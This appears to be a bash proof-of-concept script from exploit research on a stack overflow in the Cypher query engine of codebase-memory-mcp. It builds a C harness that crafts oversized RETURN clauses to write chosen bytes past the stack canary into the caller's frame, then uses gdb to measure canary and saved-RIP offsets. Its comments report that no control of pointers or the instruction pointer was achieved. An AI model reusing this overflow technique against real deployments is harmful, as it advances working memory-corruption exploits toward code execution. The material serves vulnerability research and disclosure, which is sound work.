#!/usr/bin/env bash
# W12: bounded probe of the post-canary (higher-stride) projection writes.
# Two measured results:
#  (1) an empty property at item index 38 preserves the canary, so N=40 returns
#      RC=0 while the chosen bytes land past saved RIP in the caller's frame;
#  (2) strides far enough to reach an ancestor saved RIP cannot be reached:
#      rb_set_columns() reads cols[0..count-1] from a 32-element stack array,
#      and a large count faults before the projection loop.
# Read-only: no source, pin, matrix row, binary or canonical harness is changed.
# The throwaway harness and binary live in /tmp.
set -eu
HERE="$(cd "$(dirname "$0")" && pwd)"
VULN="$HERE/src/codebase-memory-mcp-5554f8a46abf"
LOG="$HERE/evidence/control-flow-bypass.txt"
: > "$LOG"
say() { printf '%s\n' "$*" >> "$LOG"; }

cat > /tmp/cbm-w12-far.c <<'SRC'
#include "cypher/cypher.h"
#include "store/store.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv) {
    int active = argc > 1 ? atoi(argv[1]) : -1;
    int n = argc > 2 ? atoi(argv[2]) : 40;
    const char *value = argc > 3 ? argv[3] : "AB";
    cbm_store_t *s = cbm_store_open_memory();
    if (!s) return 2;
    cbm_store_upsert_project(s, "test", "/tmp/test");
    cbm_node_t node = {.project = "test", .label = "Function", .name = value,
                       .qualified_name = "test.HandleOrder", .file_path = "handler.go",
                       .start_line = 10, .end_line = 30};
    cbm_store_upsert_node(s, &node);
    static char query[131072];
    size_t off = (size_t)snprintf(query, sizeof(query), "MATCH (f:Function) RETURN ");
    for (int i = 0; i < n; i++)
        off += (size_t)snprintf(query + off, sizeof(query) - off, "%s%s", i ? ", " : "",
                                i == active ? "f.name" : "f.no_such_property");
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, query, "test", 0, &r);
    printf("ACTIVE=%d ITEMS=%d VALUE=%s RC=%d ROWS=%d COLS=%d ERR=%s QLEN=%zu\n",
           active, n, value, rc, r.row_count, r.col_count, r.error ? r.error : "(none)",
           strlen(query));
    fflush(stdout);
    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    return 0;
}
SRC

say "codebasememory2shell W12 higher-stride probe, $(date -u +%Y-%m-%dT%H:%M:%SZ)"
say "binary: /tmp/cbm-w12-far, pinned vulnerable cypher.c, same flags as build.sh plain target"
say ""
say "=== build ==="
(
  cd "$VULN"
  gcc -std=c11 -g -O1 -w -Ivendored/mimalloc/include -Ivendored/mimalloc/src \
    -DMI_OVERRIDE=0 -c vendored/mimalloc/src/static.c -o /tmp/cbm-w12-mimalloc.o
  gcc -std=c11 -D_DEFAULT_SOURCE -g -O1 -w -Iinternal/cbm \
    -Iinternal/cbm/vendored/ts_runtime/include -Iinternal/cbm/vendored/ts_runtime/src \
    -c internal/cbm/ts_runtime.c -o /tmp/cbm-w12-tsruntime.o
) >> "$LOG" 2>&1
(
  cd "$VULN"
  gcc -std=c11 -D_DEFAULT_SOURCE -D_GNU_SOURCE -g -O1 -fno-omit-frame-pointer -w \
    -Isrc -Ivendored -Ivendored/sqlite3 -Ivendored/mimalloc/include \
    -Iinternal/cbm -Iinternal/cbm/vendored/ts_runtime/include \
    -o /tmp/cbm-w12-far /tmp/cbm-w12-far.c \
    src/cypher/cypher.c src/store/store.c \
    src/foundation/arena.c src/foundation/hash_table.c src/foundation/str_intern.c \
    src/foundation/log.c src/foundation/str_util.c src/foundation/platform.c \
    src/foundation/system_info.c src/foundation/slab_alloc.c src/foundation/yaml.c \
    src/foundation/compat.c src/foundation/compat_thread.c src/foundation/compat_fs.c \
    src/foundation/compat_regex.c src/foundation/mem.c src/foundation/diagnostics.c \
    src/foundation/profile.c src/foundation/dump_verify.c src/foundation/limits.c \
    src/foundation/subprocess.c vendored/sqlite3/sqlite3.c vendored/yyjson/yyjson.c \
    /tmp/cbm-w12-mimalloc.o /tmp/cbm-w12-tsruntime.o \
    -lm -lpthread -lz -lstdc++
) >> "$LOG" 2>&1
say "build RC=$?"

say ""
say "=== N=40, chosen value at item 39, all other properties empty ==="
(/tmp/cbm-w12-far 39 40 MISHE-OO0123456789ABCDEF >> "$LOG" 2>&1 || true)
say ""

cat > /tmp/cbm-w12-near.gdb <<'GDB'
set pagination off
set confirm off
break cypher.c:4118
run 39 40 MISHE-OO0123456789ABCDEF
printf "\n=== frame-relative state at the end of the projection loop ===\n"
printf "callee_rbp=%p canary(rbp-0x38)=%p func_bufs[39]=rbp+0x1c0=%p\n", $rbp, $rbp-0x38, $rbp+0x1c0
x/1gx $rbp-0x38
x/9gx $rbp+0x1c0
quit
GDB
say "=== gdb frame measurement (read-only) ==="
gdb -q -batch -x /tmp/cbm-w12-near.gdb /tmp/cbm-w12-far >> "$LOG" 2>&1 || true
say ""

say "=== 63-byte value: chosen bytes cover the pointer-like words at rbp+0x1d0/+0x1d8 ==="
(/tmp/cbm-w12-far 39 40 \
  MISHE-OO0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz >> "$LOG" 2>&1 || true)
cat > /tmp/cbm-w12-long.gdb <<'GDB'
set pagination off
set confirm off
break cypher.c:4118
run 39 40 MISHE-OO0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
printf "\n=== 63-byte frame write ===\n"
printf "callee_rbp=%p canary(rbp-0x38)=%p\n", $rbp, $rbp-0x38
x/1gx $rbp-0x38
x/16gx $rbp+0x1c0
quit
GDB
say "=== gdb 63-byte frame measurement (read-only) ==="
gdb -q -batch -x /tmp/cbm-w12-long.gdb /tmp/cbm-w12-far >> "$LOG" 2>&1 || true
say "The words at rbp+0x1d0/+0x1d8 held 0x5555.../0x7fff... with a 23-byte value"
say "and hold chosen ASCII with 63 bytes; the process still returns RC=0, so"
say "those caller-frame words are dead in this build. No live-pointer use shown."
say ""

say "=== far stride: main saved RIP is at rbp+0x4198 in this build; item index ~1134 ==="
say "The parser grows ret->items without a width cap, but build_return_columns()"
say "fills only col_names[0..31] (cypher.c:4074) while rb_set_columns() reads"
say "cols[0..count-1] (cypher.c:2568). Large counts fault before the write loop."
(/tmp/cbm-w12-far 1134 1135 AB >> "$LOG" 2>&1 || true)
say ""

cat > /tmp/cbm-w12-far.gdb <<'GDB'
set pagination off
set confirm off
run 1134 1135 AB
bt 5
quit
GDB
say "=== gdb backtrace of the far-stride fault ==="
gdb -q -batch -x /tmp/cbm-w12-far.gdb /tmp/cbm-w12-far >> "$LOG" 2>&1 || true
say ""
say "Conclusion: higher strides leave the execute_return_simple canary intact"
say "when the index-38 property is empty, so chosen bytes do reach the caller's"
say "frame while the process survives (caller query-text buffer, not a pointer)."
say "Ancestor saved RIPs are not reachable: the 32-element col_names read in"
say "rb_set_columns() faults first. No pointer/IP control, command or rung 5."
sha256sum "$LOG"
